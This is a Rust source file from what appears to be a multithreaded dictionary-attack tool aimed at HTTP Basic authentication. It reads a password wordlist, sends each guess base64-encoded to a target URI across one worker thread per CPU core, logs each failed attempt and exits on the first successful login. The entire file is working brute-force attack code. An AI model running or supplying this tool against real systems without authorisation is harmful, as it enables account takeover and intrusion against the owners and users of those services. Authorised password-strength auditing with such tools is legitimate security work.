use crossbeam_channel::Receiver;

use super::{
    connection::{http_req, BruteResponse},
    console::{print_error, print_help, print_result},
};
use std::{
    collections::HashMap,
    fs::File,
    io::{self, BufRead},
    path::Path,
    process,
    time::Instant,
};

pub fn execute_command(parsed_command: HashMap<String, String>) {
    let main = parsed_command.get("main");

    match main {
        Some(value) => match value.to_string().as_str() {
            "help" => print_help(),
            command => print_error(format!("Invalid command {}", command)),
        },
        _ => attack_optimized(parsed_command),
    }
}

fn attack_optimized(parsed_command: HashMap<String, String>) {
    const CHANNEL_BOUND: usize = 10000000;

    let start = Instant::now();
    let filename = parsed_command.get("dictionary").unwrap();
    println!("Reading filename {}...", &filename);
    if let Ok(lines) = read_lines(&filename) {
        let uri = parsed_command.get("uri").unwrap();
        let username = parsed_command.get("username").unwrap();
        rayon::scope(|s| {
            let (work_queue_sender, work_queue_receiver) =
                crossbeam_channel::bounded(CHANNEL_BOUND);
            let max_threads_supported = num_cpus::get();
            println!("I will use [{}] threads", max_threads_supported);
            for task_counter in 0..max_threads_supported {
                let work_receiver: Receiver<String> = work_queue_receiver.clone();
                s.spawn(move |_| {
                    do_job(
                        task_counter,
                        username.as_str(),
                        uri.as_str(),
                        &start,
                        work_receiver,
                    );
                });
            }
            let mut i = 0;
            for line in lines {
                if let Ok(password) = line {
                    work_queue_sender.send(password).unwrap();
                    i = (i + 1) % max_threads_supported;
                }
            }
            drop(work_queue_sender);
        });
    }
}

fn do_job(
    task_counter: usize,
    username: &str,
    uri: &str,
    start: &Instant,
    work_receiver: Receiver<String>,
) {
    println!("thread {} initialized", &task_counter);
    loop {
        let tx_res = work_receiver.recv();
        match tx_res {
            Ok(tx) => match attack_request(&username, &uri, &tx) {
                Ok(_) => {
                    let duration = start.elapsed();
                    println!("duration: {:?}", duration);
                    process::exit(0x0100);
                }
                _ => (),
            },
            Err(err) => {
                println!("thread {} finished job: {}", &task_counter, err);
                break;
            }
        }
    }
}

fn attack_request(username: &str, uri: &str, password: &str) -> Result<BruteResponse, String> {
    let auth = base64::encode(format!("{}:{}", &username, &password));
    let status = http_req(uri, &auth, username, &password);
    if status.is_ok() {
        let result = status.unwrap();

        print_result(
            0,
            &result.message,
            &result.uri,
            &result.username,
            &result.password,
            &result.base64,
        );
        return Ok(result);
    } else {
        println!(
            "username: {}, password :{} does not match :(",
            &username, &password
        );
    }
    Err("No password found".to_string())
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
